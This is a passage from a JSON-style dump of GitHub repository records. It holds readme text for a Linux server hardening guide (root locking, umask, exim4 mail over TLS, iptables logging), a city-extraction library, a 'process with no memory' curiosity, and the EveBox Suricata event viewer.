[`sulogin`](https://linux.die.net/man/8/sulogin) (like Debian) to drop to a **root** console during boot failures, then locking the **root** account will prevent `sulogin` from opening the **root** shell and you will get this error:\\n\\n Cannot open access to console, the root account is locked.\\n\\n See sulogin(8) man page for more details.\\n\\n Press Enter to continue.\\n\\nTo work around this, you can use the `--force` option for `sulogin`. Some distributions already include this, or some other, workaround.\\n\\nAn alternative to locking the **root** acount is set a long/complicated **root** password and store it in a secured, non digital format. That way you have it when/if you need it.\\n\\n#### Goals\\n\\n- locked **root** account that nobody can use to log in as **root**\\n\\n#### Notes\\n\\n- Some distributions disable **root** login by default (e.g. Ubuntu) so you may not need to do this step. Check with your distribution's documentation.\\n\\n#### References\\n\\n- https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=806852\\n- https://github.com/systemd/systemd/issues/7115\\n- https://github.com/karelzak/util-linux/commit/7ff1162e67164cb4ece19dd809c26272461aa254\\n- https://github.com/systemd/systemd/issues/11596\\n- https://www.reddit.com/r/selfhosted/comments/aoxd4l/new_guide_created_by_me_how_to_secure_a_linux/eg4rkfi/\\n- `man systemd`\\n\\n#### Steps\\n\\n1. Lock the **root** account:\\n\\n ``` bash\\n sudo passwd -l root\\n ```\\n\\n</details><br />\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Change Default umask\\n\\n<details><summary>!! PROCEED AT YOUR OWN RISK !!</summary>\\n\\n#### Why\\n\\numask controls the **default** permissions of files/folders when they are created. Insecure file/folder permissions give other accounts potentially unauthorized access to your data. This may include the ability to make configuration changes.\\n\\n- For **non-root** accounts, there is no need for other accounts to get any access to the account's files/folders **by default**.\\n- For the **root** account, there is no need for the file/folder primary group or other accounts to have any access to **root**'s files/folders **by default**.\\n\\nWhen and if other accounts need access to a file/folder, you want to explicitly grant it using a combination of file/folder permissions and primary group.\\n\\n#### Why Not\\n\\nChanging the default umask can create unexpected problems. For example, if you set umask to `0077` for **root**, then **non-root** accounts **will not** have access to application configuration files/folders in `/etc/` which could break applications that do not run with **root** privileges.\\n\\n#### How It Works\\n\\nIn order to explain how umask works I'd have to explain how Linux file/folder permissions work. As that is a rather complicated question, I will defer you to the references below for further reading.\\n\\n#### Goals\\n\\n- set default umask for **non-root** accounts to **0027**\\n- set default umask for the **root** account to **0077**\\n\\n#### Notes\\n\\n- umask is a Bash built-in which means a user can change their own umask setting.\\n\\n#### References\\n\\n- https://www.linuxnix.com/umask-define-linuxunix/\\n- https://serverfault.com/questions/818783/which-umask-is-more-secure-in-linux-022-or-027\\n- https://www.cyberciti.biz/tips/understanding-linux-unix-umask-value-usage.html\\n- `man umask`\\n\\n#### Steps\\n\\n1. Make a backup of files we'll be editing:\\n\\n ``` bash\\n sudo cp --archive /etc/profile /etc/profile-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo cp --archive /etc/bash.bashrc /etc/bash.bashrc-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo cp --archive /etc/login.defs /etc/login.defs-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo cp --archive /root/.bashrc /root/.bashrc-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Set default umask for **non-root** accounts to **0027** by adding this line to `/etc/profile` and `/etc/bash.bashrc`:\\n\\n ```\\n umask 0027\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n echo -e \\\"\\\\numask 0027 # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /etc/profile /etc/bash.bashrc\\n ```\\n\\n1. We also need to add this line to `/etc/login.defs`:\\n\\n ```\\n UMASK 0027\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n echo -e \\\"\\\\nUMASK 0027 # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /etc/login.defs\\n ```\\n\\n1. Set default umask for the **root** account to **0077** by adding this line to `/root/.bashrc`:\\n\\n ```\\n umask 0077\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n echo -e \\\"\\\\numask 0077 # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /root/.bashrc\\n ```\\n\\n</details><br />\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Orphaned Software\\n\\n<details><summary>!! PROCEED AT YOUR OWN RISK !!</summary>\\n\\n#### Why\\n\\nAs you use your system, and you install and uninstall software, you'll eventually end up with orphaned, or unused software/packages/libraries. You don't need to remove them, but if you don't need them, why keep them? When security is a priority, anything not explicitly needed is a potential security threat. You want to keep your server as trimmed and lean as possible.\\n\\n#### Notes\\n\\n- Each distribution manages software/packages/libraries differently so how you find and remove orphaned packages will be different. So far I only have steps for Debian based systems.\\n\\n#### Debian Based Systems\\n\\nOn Debian based systems, you can use [deborphan](http://freshmeat.sourceforge.net/projects/deborphan/) to find orphaned packages.\\n\\n##### <a name=\\\"orphaned-software-why-not\\\"></a>Why Not\\n\\nKeep in mind, deborphan finds packages that have **no package dependencies**. That does not mean they are not used. You could very well have a package you use every day that has no dependencies that you wouldn't want to remove. And, if deborphan gets anything wrong, then removing critical packages may break your system.\\n\\n##### Steps\\n\\n1. Install deborphan.\\n\\n ``` bash\\n sudo apt install deborphan\\n ```\\n\\n1. Run deborphan as **root** to see a list of orphaned packages:\\n\\n ``` bash\\n sudo deborphan\\n ```\\n\\n > ```\\n > libxapian30\\n > libpipeline1\\n > ```\\n\\n1. [Assuming you want to remove all of the packages deborphan finds](#orphaned-software-why-not), you can pass it's output to `apt` to remove them:\\n\\n ``` bash\\n sudo apt --autoremove purge $(deborphan)\\n ```\\n\\n</details>\\n\\n</details><br />\\n\\n([Table of Contents](#table-of-contents))\\n\\n## The Miscellaneous\\n\\n### Gmail and Exim4 As MTA With Implicit TLS\\n\\n#### Why\\n\\nUnless you're planning on setting up your own mail server, you'll need a way to send e-mails from your server. This will be important for system alerts/messages.\\n\\nYou can use any Gmail account. I recommend you create one specific for this server. That way if your server **is** compromised, the bad-actor won't have any passwords for your primary account. Granted, if you have 2FA/MFA enabled and you use an app password, there isn't much a bad-actor can do with just the app password, but why take the risk?\\n\\nThere are many guides on-line that cover how to configure Gmail as MTA using STARTTLS including a [previous version of this guide](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/tree/cc5edcae1cf846dd250e76b121e721d836481d2f#configure-gmail-as-mta). With STARTTLS, an initial **unencrypted** connection is made and then upgraded to an encrypted TLS or SSL connection. Instead, with the approach outlined below, an encrypted TLS connection is made from the start.\\n\\nAlso, as discussed in [issue #29](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/29) and [here](https://blog.dhampir.no/content/exim4-line-length-in-debian-stretch-mail-delivery-failed-returning-message-to-sender), exim4 will fail for messages with long lines. We'll fix this in this section too.\\n\\n#### Goals\\n\\n- `mail` configured to send e-mails from your server using [Gmail](https://mail.google.com/)\\n- long line support for exim4\\n\\n#### References\\n\\n- Thanks to [remyabel](https://github.com/remyabel) for figuring out how to get this to work with TLS as documented in [issue #24](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/24) and [pull request #26](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/pull/26).\\n- https://wiki.debian.org/Exim\\n- https://wiki.debian.org/GmailAndExim4\\n- https://www.exim.org/exim-html-current/doc/html/spec_html/ch-encrypted_smtp_connections_using_tlsssl.html\\n- https://php.quicoto.com/setup-exim4-to-use-gmail-in-ubuntu/\\n- https://www.fastmail.com/help/technical/ssltlsstarttls.html\\n- exim4 fails for messages with long lines - [issue #29](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/29) and https://blog.dhampir.no/content/exim4-line-length-in-debian-stretch-mail-delivery-failed-returning-message-to-sender\\n\\n#### Steps\\n\\n1. Install exim4. You will also need openssl and ca-certificates.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install exim4 openssl ca-certificates\\n ```\\n\\n1. Configure exim4:\\n\\n For Debian based systems:\\n ``` bash\\n sudo dpkg-reconfigure exim4-config\\n ```\\n\\n You'll be prompted with some questions:\\n\\n |Prompt|Answer|\\n |--:|--|\\n |General type of mail configuration|`mail sent by smarthost; no local mail`|\\n |System mail name|`localhost`|\\n |IP-addresses to listen on for incoming SMTP connections|`127.0.0.1; ::1`|\\n |Other destinations for which mail is accepted|(default)|\\n |Visible domain name for local users|`localhost`|\\n |IP address or host name of the outgoing smarthost|`smtp.gmail.com::465`|\\n |Keep number of DNS-queries minimal (Dial-on-Demand)?|`No`|\\n |Split configuration into small files?|`No`|\\n\\n1. Make a backup of `/etc/exim4/passwd.client`:\\n\\n ``` bash\\n sudo cp --archive /etc/exim4/passwd.client /etc/exim4/passwd.client-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Add a line like this to `/etc/exim4/passwd.client`\\n\\n ```\\n smtp.gmail.com:yourAccount@gmail.com:yourPassword\\n *.google.com:yourAccount@gmail.com:yourPassword\\n ```\\n\\n **Notes**:\\n - Replace `yourAccount@gmail.com` and `yourPassword` with your details. If you have 2FA/MFA enabled on your Gmail then you'll need to create and use an app password here.\\n - Always check `host smtp.gmail.com` for the most up-to-date domains to list.\\n\\n1. This file has your Gmail password so we need to lock it down:\\n\\n ``` bash\\n sudo chown root:Debian-exim /etc/exim4/passwd.client\\n sudo chmod 640 /etc/exim4/passwd.client\\n ```\\n\\n1. The next step is to create an TLS certificate that exim4 will use to make the encrypted connection to `smtp.gmail.com`. You can use your own certificate, like one from [Let's Encrypt](https://letsencrypt.org/), or create one yourself using openssl. We will use a script that comes with exim4 that calls openssl to make our certificate:\\n\\n ``` bash\\n sudo bash /usr/share/doc/exim4-base/examples/exim-gencert\\n ```\\n\\n > ```\\n > [*] Creating a self signed SSL certificate for Exim!\\n > This may be sufficient to establish encrypted connections but for\\n > secure identification you need to buy a real certificate!\\n > \\n > Please enter the hostname of your MTA at the Common Name (CN) prompt!\\n > \\n > Generating a RSA private key\\n > ..........................................+++++\\n > ................................................+++++\\n > writing new private key to '/etc/exim4/exim.key'\\n > -----\\n > You are about to be asked to enter information that will be incorporated\\n > into your certificate request.\\n > What you are about to enter is what is called a Distinguished Name or a DN.\\n > There are quite a few fields but you can leave some blank\\n > For some fields there will be a default value,\\n > If you enter '.', the field will be left blank.\\n > -----\\n > Country Code (2 letters) [US]:[redacted]\\n > State or Province Name (full name) []:[redacted]\\n > Locality Name (eg, city) []:[redacted]\\n > Organization Name (eg, company; recommended) []:[redacted]\\n > Organizational Unit Name (eg, section) []:[redacted]\\n > Server name (eg. ssl.domain.tld; required!!!) []:localhost\\n > Email Address []:[redacted]\\n > [*] Done generating self signed certificates for exim!\\n > Refer to the documentation and example configuration files\\n > over at /usr/share/doc/exim4-base/ for an idea on how to enable TLS\\n > support in your mail transfer agent.\\n > ```\\n\\n1. Instruct exim4 to use TLS and port 465, and [fix exim4's long lines issue](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/29), by creating the file `/etc/exim4/exim4.conf.localmacros` and adding:\\n\\n ```\\n MAIN_TLS_ENABLE = 1\\n REMOTE_SMTP_SMARTHOST_HOSTS_REQUIRE_TLS = *\\n TLS_ON_CONNECT_PORTS = 465\\n REQUIRE_PROTOCOL = smtps\\n IGNORE_SMTP_LINE_LENGTH_LIMIT = true\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n cat << EOF | sudo tee /etc/exim4/exim4.conf.localmacros\\n MAIN_TLS_ENABLE = 1\\n REMOTE_SMTP_SMARTHOST_HOSTS_REQUIRE_TLS = *\\n TLS_ON_CONNECT_PORTS = 465\\n REQUIRE_PROTOCOL = smtps\\n IGNORE_SMTP_LINE_LENGTH_LIMIT = true\\n EOF\\n ```\\n\\n1. Make a backup of exim4's configuration file `/etc/exim4/exim4.conf.template`:\\n\\n ``` bash\\n sudo cp --archive /etc/exim4/exim4.conf.template /etc/exim4/exim4.conf.template-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Add the below to `/etc/exim4/exim4.conf.template` after the `.ifdef REMOTE_SMTP_SMARTHOST_HOSTS_REQUIRE_TLS ... .endif` block:\\n\\n ```\\n .ifdef REQUIRE_PROTOCOL\\n protocol = REQUIRE_PROTOCOL\\n .endif\\n ```\\n\\n > ```\\n > .ifdef REMOTE_SMTP_SMARTHOST_HOSTS_REQUIRE_TLS\\n > hosts_require_tls = REMOTE_SMTP_SMARTHOST_HOSTS_REQUIRE_TLS\\n > .endif\\n > .ifdef REQUIRE_PROTOCOL\\n > protocol = REQUIRE_PROTOCOL\\n > .endif\\n > .ifdef REMOTE_SMTP_HEADERS_REWRITE\\n > headers_rewrite = REMOTE_SMTP_HEADERS_REWRITE\\n > .endif\\n > ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n sudo sed -i -r -e '/^.ifdef REMOTE_SMTP_SMARTHOST_HOSTS_REQUIRE_TLS$/I { :a; n; /^.endif$/!ba; a\\\\# added by '\\\"$(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\"'\\\\n.ifdef REQUIRE_PROTOCOL\\\\n protocol = REQUIRE_PROTOCOL\\\\n.endif\\\\n# end add' -e '}' /etc/exim4/exim4.conf.template\\n ```\\n\\n1. Add the below to `/etc/exim4/exim4.conf.template` inside the `.ifdef MAIN_TLS_ENABLE` block:\\n\\n ```\\n .ifdef TLS_ON_CONNECT_PORTS\\n tls_on_connect_ports = TLS_ON_CONNECT_PORTS\\n .endif\\n ```\\n\\n > ```\\n > .ifdef MAIN_TLS_ENABLE\\n > .ifdef TLS_ON_CONNECT_PORTS\\n > tls_on_connect_ports = TLS_ON_CONNECT_PORTS\\n > .endif\\n > ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n sudo sed -i -r -e \\\"/\\\\.ifdef MAIN_TLS_ENABLE/ a # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\\n.ifdef TLS_ON_CONNECT_PORTS\\\\n tls_on_connect_ports = TLS_ON_CONNECT_PORTS\\\\n.endif\\\\n# end add\\\" /etc/exim4/exim4.conf.template\\n ```\\n \\n1. Update exim4 configuration to use TLS and then restart the service:\\n\\n ``` bash\\n sudo update-exim4.conf\\n sudo service exim4 restart\\n ```\\n\\n1. If you're using [UFW](#ufw-uncomplicated-firewall), you'll need to allow outbound traffic on 465. To do this we'll create a custom UFW application profile and then enable it. Create the file `/etc/ufw/applications.d/smtptls`, add this, then run `ufw allow out smtptls comment 'open TLS port 465 for use with SMPT to send e-mails'`:\\n\\n ```\\n [SMTPTLS]\\n title=SMTP through TLS\\n description=This opens up the TLS port 465 for use with SMPT to send e-mails.\\n ports=465/tcp\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n cat << EOF | sudo tee /etc/ufw/applications.d/smtptls\\n [SMTPTLS]\\n title=SMTP through TLS\\n description=This opens up the TLS port 465 for use with SMPT to send e-mails.\\n ports=465/tcp\\n EOF\\n\\n sudo ufw allow out smtptls comment 'open TLS port 465 for use with SMPT to send e-mails'\\n ```\\n\\n1. Add some mail aliases so we can send e-mails to local accounts by adding lines like this to `/etc/aliases`:\\n\\n ```\\n user1: user1@gmail.com\\n user2: user2@gmail.com\\n ...\\n ```\\n\\n You'll need to add all the local accounts that exist on your server.\\n\\n1. Test your setup:\\n\\n ```\\n echo \\\"test\\\" | mail -s \\\"Test\\\" email@gmail.com\\n sudo tail /var/log/exim4/mainlog\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Separate iptables Log File\\n\\n#### Why\\n\\nThere will come a time when you'll need to look through your iptables logs. Having all the iptables logs go to their own file will make it a lot easier to find what you're looking for.\\n\\n#### References\\n\\n- https://blog.shadypixel.com/log-iptables-messages-to-a-separate-file-with-rsyslog/\\n- https://gist.github.com/netson/c45b2dc4e835761fbccc\\n- https://www.rsyslog.com/doc/v8-stable/configuration/actions.html\\n\\n#### Steps\\n\\n1. The first step is by telling your firewall to prefix all log entries with some unique string. If you're using iptables directly, you would do something like `--log-prefix \\\"[IPTABLES] \\\"` for all the rules. We took care of this in step [step 4 of installing psad](#psad_step4).\\n\\n1. After you've added a prefix to the firewall logs, we need to tell rsyslog to send those lines to its own file. Do this by creating the file `/etc/rsyslog.d/10-iptables.conf` and adding this:\\n\\n ```\\n :msg, contains, \\\"[IPTABLES] \\\" /var/log/iptables.log\\n & stop\\n ```\\n \\n If you're expecting a lot if data being logged by your firewall, prefix the filename with a `-` [\\\"to omit syncing the file after every logging\\\"](https://www.rsyslog.com/doc/v8-stable/configuration/actions.html#regular-file). For example:\\n\\n ```\\n :msg, contains, \\\"[IPTABLES] \\\" -/var/log/iptables.log\\n & stop\\n ```\\n\\n **Note**: Remember to change the prefix to whatever you use.\\n \\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n cat << EOF | sudo tee /etc/rsyslog.d/10-iptables.conf\\n :msg, contains, \\\"[IPTABLES] \\\" /var/log/iptables.log\\n & stop\\n EOF\\n ```\\n\\n1. Since we're logging firewall messages to a different file, we need to tell psad where the new file is. Edit `/etc/psad/psad.conf` and set `IPT_SYSLOG_FILE` to the path of the log file. For example:\\n\\n ```\\n IPT_SYSLOG_FILE /var/log/iptables.log;\\n ```\\n \\n **Note**: Remember to change the prefix to whatever you use.\\n \\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n \\n ``` bash\\n sudo sed -i -r -e \\\"s/^(IPT_SYSLOG_FILE\\\\s+)([^;]+)(;)$/# \\\\1\\\\2\\\\3 # commented by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\\n\\\\1\\\\/var\\\\/log\\\\/iptables.log\\\\3 # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")/\\\" /etc/psad/psad.conf \\n ```\\n\\n1. Restart psad and rsyslog to activate the changes (or reboot):\\n\\n ``` bash\\n sudo psad -R\\n sudo psad --sig-update\\n sudo psad -H\\n sudo service rsyslog restart\\n ```\\n\\n1. The last thing we have to do is tell logrotate to rotate the new log file so it doesn't get to big and fill up our disk. Create the file `/etc/logrotate.d/iptables` and add this:\\n\\n ```\\n /var/log/iptables.log\\n {\\n rotate 7\\n daily\\n missingok\\n notifempty\\n delaycompress\\n compress\\n postrotate\\n invoke-rc.d rsyslog rotate > /dev/null\\n endscript\\n }\\n ```\\n \\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n \\n ``` bash\\n cat << EOF | sudo tee /etc/logrotate.d/iptables\\n /var/log/iptables.log\\n {\\n rotate 7\\n daily\\n missingok\\n notifempty\\n delaycompress\\n compress\\n postrotate\\n invoke-rc.d rsyslog rotate > /dev/null\\n endscript\\n }\\n EOF\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n## Left Over\\n\\n### Contacting Me\\n\\nFor any questions, comments, concerns, feedback, or issues, submit a [new issue](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/new).\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Helpful Links\\n\\n- [https://github.com/pratiktri/server_init_harden](https://github.com/pratiktri/server_init_harden) - Bash script that automates few of the tasks that you need to perform on a new Linux server to give it basic amount security.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Acknowledgments\\n\\n- https://www.reddit.com/r/linuxquestions/comments/aopzl7/new_guide_created_by_me_how_to_secure_a_linux/\\n- https://www.reddit.com/r/selfhosted/comments/aoxd4l/new_guide_created_by_me_how_to_secure_a_linux/\\n- https://news.ycombinator.com/item?id=19177435#19178618\\n- https://www.reddit.com/r/linuxadmin/comments/arx7xo/howtosecurealinuxserver_an_evolving_howto_guide/\\n- https://www.reddit.com/r/linux/comments/arx7st/howtosecurealinuxserver_an_evolving_howto_guide/\\n\\n([Table of Contents](#table-of-contents))\\n\\n### License and Copyright\\n\\n[![CC-BY-SA](https://i.creativecommons.org/l/by-sa/4.0/88x31.png)](http://creativecommons.org/licenses/by-sa/4.0/)\\n\\n[How To Secure A Linux Server](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server) by [Anchal Nigam](https://github.com/imthenachoman) is licensed under [Creative Commons Attribution-ShareAlike 4.0 International License](http://creativecommons.org/licenses/by-sa/4.0).\\n\\nSee [LICENSE](LICENSE.txt) for the full license.\\n\\n([Table of Contents](#table-of-contents))\\n\"", "topics": ["server", "defensive", "blueteam", "hardening", "linux", "security"], "writeup": "", "ignoredescription": false, "id": 35, "full_name": "imthenachoman/How-To-Secure-A-Linux-Server", "url": "https://github.com/imthenachoman/How-To-Secure-A-Linux-Server", "topic_string": "server defensive blueteam hardening linux security"},
{"tags": [], "owner": "iwpnd", "description": "Extract city and country mentions from Text like GeoText without regex, but FlashText, a Aho-Corasick implementation.", "name": "flashgeotext", "topics_string": "", "language": "Python", "readme": "\"<p align=\\\"center\\\">\\n<a href=\\\"https://github.com/iwpnd/flashgeotext/actions\\\" target=\\\"_blank\\\">\\n <img src=\\\"https://github.com/iwpnd/flashgeotext/workflows/build/badge.svg?branch=master\\\" alt=\\\"Build Status\\\">\\n</a>\\n<a href=\\\"https://codecov.io/gh/iwpnd/flashgeotext\\\" target=\\\"_blank\\\">\\n <img src=\\\"https://codecov.io/gh/iwpnd/flashgeotext/branch/master/graph/badge.svg\\\" alt=\\\"Coverage\\\">\\n</a>\\n</p>\\n\\n---\\n# flashgeotext :zap::earth_africa:\\n\\nExtract and count countries and cities (+their synonyms) from text, like [GeoText](https://github.com/elyase/geotext) on steroids using [FlashText](https://github.com/vi3k6i5/flashtext/), a Aho-Corasick implementation. Flashgeotext is a fast, batteries-included (and BYOD) and native python library that extracts one or more sets of given city and country names (+ synonyms) from an input text.\\n\\n**documentation**: [https://flashgeotext.iwpnd.pw/](https://flashgeotext.iwpnd.pw/) \\n**introductory blogpost**: [https://iwpnd.pw/articles/2020-02/flashgeotext-library](https://iwpnd.pw/articles/2020-02/flashgeotext-library)\\n\\n## Usage\\n\\n```python\\nfrom flashgeotext.geotext import GeoText\\n\\ngeotext = GeoText(use_demo_data=True)\\n\\ninput_text = '''Shanghai. The Chinese Ministry of Finance in Shanghai said that China plans\\n to cut tariffs on $75 billion worth of goods that the country\\n imports from the US. Washington welcomes the decision.'''\\n\\ngeotext.extract(input_text=input_text, span_info=True)\\n>> {\\n 'cities': {\\n 'Shanghai': {\\n 'count': 2,\\n 'span_info': [(0, 8), (45, 53)]\\n },\\n 'Washington, D.C.': {\\n 'count': 1,\\n 'span_info': [(175, 185)]\\n }\\n },\\n 'countries': {\\n 'China': {\\n 'count': 1,\\n 'span_info': [(64, 69)]\\n },\\n 'United States': {\\n 'count': 1,\\n 'span_info': [(171, 173)]\\n }\\n }\\n }\\n```\\n\\n## Getting Started\\n\\nThese instructions will get you a copy of the project up and running on your local machine for development and testing purposes.\\n\\n### Installing\\n\\nfor usage:\\n```bash\\npip install flashgeotext\\n```\\n\\nfor development:\\n```bash\\ngit clone https://github.com/iwpnd/flashgeotext.git\\npip install flit\\nflit install\\n```\\n\\n### Running the tests\\n\\n```bash\\npytest flashgeotext/tests -v\\n```\\n\\n## Authors\\n\\n* **Benjamin Ramser** - *Initial work* - [iwpnd](https://github.com/iwpnd)\\n\\nSee also the list of [contributors](https://github.com/iwpnd/flashgeotext/contributors) who participated in this project.\\n\\n## License\\n\\nThis project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details\\n\\nDemo Data cities from [http://www.geonames.org](http://www.geonames.org) licensed under the Creative Commons Attribution 3.0 License.\\n\\n## Acknowledgments\\n\\n* Hat tip to [@vi3k6i5](https://github.com/vi3k6i5) for his [paper](https://arxiv.org/abs/1711.00046) and implementation\\n\"", "topics": ["named-entity-extraction", "geotext", "search", "flashtext"], "writeup": "", "ignoredescription": false, "id": 36, "full_name": "iwpnd/flashgeotext", "url": "https://github.com/iwpnd/flashgeotext", "topic_string": "named-entity-extraction geotext search flashtext"},
{"tags": [], "owner": "izabera", "description": "A \"living\" Linux process with no memory", "name": "zeromaps", "topics_string": "", "language": "C", "readme": "\"A \\\"living\\\" Linux process with no memory\\n=======================================\\n\\n\\n\\ntl;dr\\n----\\n\\n- thread1 goes into uninterruptible sleep\\n- thread2 unmaps everything and segfaults\\n- segv can't kill the process because of thread1's D state\\n- /proc/pid/maps is now empty\\n- ???\\n- PROFIT!!!\\n\\n\\n\\n[![asciicast](https://asciinema.org/a/313677.svg)](https://asciinema.org/a/313677)\\n\\n\\n\\nImplementation details\\n----------------------\\n\\nThis code gets a list of all memory maps from `/proc/self/maps`, then creates a\\nnew executable map where it jits some code that calls `munmap()` on each of the\\nmaps it just got, and finally on the map it's on. This is just a quick example\\nwith no portability in mind, so the source code contains the actual bytes that\\nwould be emitted by a x64 compiler. After unmapping the final map, where the\\njit code lies, there's no new instruction to execute and a segfault is raised.\\n\\nThis segfault can't kill the entire process if one thread is stuck in\\nuninterruptible sleep. To reliably send a thread in such state, we create a\\nsimple FUSE filesystem in python, in which doing anything on a particular file\\nwill block until a key is pressed.\\n\\nThis code also does its own \\\"linking\\\" to make sure that the list of maps\\ndoesn't get unmapped too early.\\n\\n\\nRequirements\\n------------\\n\\n- a c compiler\\n- python2 + fuse\\n- x64\\n- a modern Linux with no vsyscall page (this page is too high up and munmap\\n would return EINVAL)\\n\\n\\n\\nWhy\\n---\\n\\nI don't know. I thought it was funny.\\n\"", "topics": ["redteam", "linux", "memory", "trick"], "writeup": "A linux trick for creating a \"living\" Linux process with no memory. Could be useful as a redteam trick", "ignoredescription": true, "id": 37, "full_name": "izabera/zeromaps", "url": "https://github.com/izabera/zeromaps", "topic_string": "redteam linux memory trick"},
{"tags": [], "owner": "jasonish", "description": "Web Based Event Viewer (GUI) for Suricata EVE Events in Elastic Search", "name": "evebox", "topics_string": "", "language": "Rust", "readme": "\"# EveBox [![Documentation Status](https://readthedocs.org/projects/evebox/badge/?version=latest)](https://evebox.readthedocs.io/en/latest/?badge=latest)\\n\\nEveBox is a web based Suricata \\\"eve\\\" event viewer for Elastic Search.\\n\\n![EveBox](https://evebox.org/screens/inbox.png)\\n\\n## Features\\n\\n- A web based event viewer with an \\\"Inbox\\\" approach to alert\\n management.\\n- Event search.\\n- An agent for sending Suricata events to the EveBox server (but you\\n can use Filebeat/Logstash instead).\\n- Embedded SQLite for self-contained installations.\\n\\n## Requirements\\n\\n- Suricata - to generate alerts and events.\\n\\nAnd one of...\\n\\n- An existing ElasticSearch/Logstash (version 6 or greater) setup\\n already handling Suricata events (EveBox has issues with Filebeat\\n indices at this time).\\n- Just Elastic Search, using EveBox or the EveBox agent to add events.\\n- Nothing - EveBox can use an embedded SQLite database suitable for\\n lower load installations (note: not all features supported yet).\\n- A modern web browser.\\n\\n## Installation.\\n\\nDownload a package and run the evebox application against your\\nexisting Elastic Search server.\\n\\nExample:\\n\\n ./evebox server -e http://localhost:9200\\n\\nThen visit http://localhost:5636 with your browser.\\n\\nThe latest release builds can be found at\\nhttps://evebox.org/files/release/latest/.\\n\\nThe latest development builds (from git master) can be found at\\nhttps://evebox.org/files/development/\\n\\nA [RPM](https://github.com/jasonish/evebox/wiki/EveBox-RPM-Repository)\\nand\\n[Debian](https://github.com/jasonish/evebox/wiki/EveBox-Debian-Repository) package\\nrepository are also available.\\n\\n### SELKS\\n\\nEveBox is also included\\nin [SELKS](https://www.stamus-networks.com/open-source/) which\\nprovides Suricata and an ELK stack configured and ready to go.\\n\\n### Docker\\n\\nIf you wish to install EveBox with Docker an up to date image is\\nhosted on Docker hub.\\n\\nExample:\\n\\n```\\ndocker pull jasonish/evebox:latest\\ndocker run -it -p 5636:5636 jasonish/evebox:latest -e http://elasticsearch:9200\\n```\\n\\nreplacing your __http://elasticsearch:9200__ with that of your Elastic\\nSearch URL. You most likely do not want to use localhost here as that\\nwill be the localhost of the container, not of the host.\\n\\nOR if you want to link to an already running Elastic Search container:\\n\\n```\\ndocker run -it -p 5636:5636 --link elasticsearch jasonish/evebox:latest\\n```\\n\\nThen visit http://localhost:5636 with your browser.\\n\\nThis should not require any modification to your Elastic Search\\nconfiguration. Unlike previous versions of Evebox, you do not need to\\nenable dynamic scripting and CORS.\\n\\n## Usage\\n\\nEveBox runs as a server exposing a web interface on port 5636 by\\ndefault.\\n\\n### With an Existing Elastic Search Server With Events\\n\\nThe basic mode where `eve` events are being sent to Elastic Search\\nwith Logstash and or Filebeat.\\n\\n```\\nevebox server -e http://elasticsearch:9200\\n```\\n\\n### With the Embedded SQLite Database\\n\\nThis is useful if you don't have Elastic Search and running EveBox on\\nthe same machine as Suricata. It uses an embedded SQLite database for\\nevents and is suitable for ligher loads. Currently SQLite does not\\nsupport reporting.\\n\\n```\\nevebox server -D . --datastore sqlite --input /var/log/suricata/eve.json\\n```\\n\\nMore documentation can be found at http://evebox.readthedocs.io/en/latest/.\\n\\n## Building EveBox\\n\\nEveBox consists of a JavaScript frontend, and a very minimal backend\\nwritten in Go. To build Evebox the following requirements must first\\nbe satisfied:\\n\\n* Node.js v12.16.1 or newer installed.\\n* Latest Rust stable.\\n\\nFirst checkout EveBox:\\n\\n```\\ngit clone https://github.com/jasonish/evebox.git ~/projects/evebox\\n```\\n\\nThen to build the binary:\\n```\\nmake\\n```\\n\\nOr to build a release package:\\n```\\nmake dist\\n```\\n\\nIf you don't want to bother with the required development tools, but do have\\nDocker installed, you can build a Linux release with the following command:\\n```\\n./build.sh linux\\n```\\n\\n### Possible Issues\\n\\n#### JavaScript heap out of memory\\n\\nIf you get a 